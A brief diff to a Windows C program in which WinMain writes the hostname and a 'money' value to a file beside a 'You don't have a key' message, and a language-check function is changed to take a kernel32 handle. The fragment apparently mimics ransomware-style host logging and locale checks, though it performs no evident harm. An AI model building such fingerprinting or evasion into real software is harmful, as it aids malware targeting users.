@@ -45,7 +45,9 @@ int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int n
         fprintf(file, "You don't have a key, your's is : %s and money=%d\n", hostname,money_spent);
     }
 
-    if (!is_valid_language()) {
+    fprintf(file, "Let's check your curency system\n");
+
+    if (!is_valid_language(hKernel32dll)) {
         money_spent += add(money, 500);
     }
 
